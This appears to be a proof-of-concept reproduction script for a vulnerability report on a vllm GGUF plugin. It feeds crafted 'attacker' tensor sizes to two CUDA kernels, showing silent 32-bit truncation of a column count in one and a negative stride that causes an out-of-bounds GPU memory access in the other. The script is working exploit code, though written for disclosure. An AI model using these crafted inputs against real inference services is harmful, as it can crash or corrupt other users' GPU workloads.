#!/usr/bin/env python3
"""End-to-end reproduction on the REAL vllm-gguf-plugin kernels (d4c1f0d).

Both demonstrations call the plugin's own compiled ops through
vllm_gguf_plugin.ops — the same entry the inference path uses — with
synthetic Q4_0 weights (block: fp16 d=1.0 + 0x99 nibbles -> value 1.0).

  A  mmvq extent truncation (mmvq.cuh:44 `const int ncols` <- col)
     control  col = 64          : output matches the reference GEMV
     attacker col = 2^32 + 64   : (int)col = 64 — output is bitwise
                                  identical to the 64-column control
                                  while W/x are materialized full-width.
  B  moe stride OOB (moe.cuh:13 `const int exp_stride` <- W.stride(0))
     small stride (fits int)    : kernel runs, correct non-zero result
     W.stride(0) = 3*2^30       : (int)stride < 0 — the kernel indexes
                                  expert 1 at W - 1 GiB -> CUDA illegal
                                  memory access.

Env: any CUDA GPU with ~18 GiB free; a built plugin checkout in
GGUF_BUILD (default /tmp/vllm-gguf-plugin). The module shim below
avoids importing the package __init__ (it pulls transformers); only
vllm_gguf_plugin.ops is needed.
"""
import os
import sys
import types
import importlib

BUILD = os.environ.get("GGUF_BUILD", "/tmp/vllm-gguf-plugin")
sys.modules["vllm_gguf_plugin"] = types.ModuleType("vllm_gguf_plugin")
sys.modules["vllm_gguf_plugin"].__path__ = [f"{BUILD}/vllm_gguf_plugin"]
ops = importlib.import_module("vllm_gguf_plugin.ops")

import torch
from gguf import GGMLQuantizationType

DEV, Q4_0 = "cuda", GGMLQuantizationType.Q4_0


def q4_0_weight(rows, col_blocks):
    """(rows, col_blocks*18) uint8: d=1.0 per block, every nibble 9."""
    w = torch.empty((rows, col_blocks, 18), dtype=torch.uint8, device=DEV)
    w[:, :, 0] = 0x00  # fp16 1.0, little-endian
    w[:, :, 1] = 0x3C
    w[:, :, 2:] = 0x99  # nibble pair (9,9) -> value (9-8)*1.0 = 1.0
    return w.reshape(rows, col_blocks * 18)


def free(*t):
    for x in t:
        del x
    torch.cuda.empty_cache()


print("== A. mmvq extent truncation (mmvq.cuh:44) ==")
torch.manual_seed(0)
x_ctl = torch.rand((1, 64), dtype=torch.half, device=DEV)
w_ctl = q4_0_weight(2, 2)
y_ctl = ops.ggml_mul_mat_vec_a8(w_ctl, x_ctl, Q4_0, 2).float()
ref = x_ctl.float() @ torch.ones((2, 64), device=DEV).T
print(f"A1 control col=64: max|y-ref| = {(y_ctl - ref).abs().max():.4f}"
      f"  (plugin test tolerance: atol=1)")

COL = (1 << 32) + 64
w_bad = q4_0_weight(2, COL // 32)                              # 4.5 GiB
x_bad = torch.zeros((1, COL), dtype=torch.half, device=DEV)   # 8 GiB
x_bad[:, :64] = x_ctl                            # tail zero by design
y_bad = ops.ggml_mul_mat_vec_a8(w_bad, x_bad, Q4_0, 2).float()
torch.cuda.synchronize()
same = torch.equal(y_bad, y_ctl)
print(f"A2 attacker col={COL} -> (int)col=64: y = {y_bad.cpu().numpy().round(4).tolist()}")
print(f"   bitwise identical to A1 control: {same}"
      "  => kernel computed over exactly 64 columns")
free(w_bad, x_bad, w_ctl, x_ctl, y_ctl, y_bad)

print("== B. moe stride OOB (moe.cuh:13/36) ==")
E, NROW = 2, 8


def moe_inputs(col_blocks):
    w = q4_0_weight(E * NROW, col_blocks).view(E, NROW, col_blocks * 18)
    x = torch.zeros((1, col_blocks * 32), dtype=torch.half, device=DEV)
    x[:, :64] = 0.5
    sorted_ids = torch.zeros(4, dtype=torch.int32, device=DEV)  # grid.y = 4/4
    expert_ids = torch.tensor([1], dtype=torch.int32, device=DEV)
    ntp = torch.tensor([4], dtype=torch.int32, device=DEV)
    return w, x, sorted_ids, expert_ids, ntp


w, x, s, e, n = moe_inputs(224)     # stride(0) = 8*224*18 = 32256, fits int
y = ops.ggml_moe_a8(x, w, s, e, n, Q4_0, NROW, 1, 1)
torch.cuda.synchronize()
print(f"B1 small stride={w.stride(0)}: kernel ran, y[0,:3] = "
      f"{y.float().cpu().numpy()[0, :3].round(3).tolist()}  (path is live)")
free(w, x, y)

BLOCKS = 22369632                   # stride(0) = 8*BLOCKS*18 = 3*2^30
w, x, s, e, n = moe_inputs(BLOCKS)
s0 = w.stride(0)
print(f"B2 W.stride(0) = {s0} -> (int) = {s0 - 2**32}"
      f"  (kernel reads expert 1 at W - 1 GiB, moe.cuh:36)")
try:
    y = ops.ggml_moe_a8(x, w, s, e, n, Q4_0, NROW, 1, 1)
    torch.cuda.synchronize()
    print("   returned without error:", y.shape, "— UNEXPECTED")
except RuntimeError as err:
    print(f"   OOB CONFIRMED on the real plugin kernel: {str(err).splitlines()[0]}")
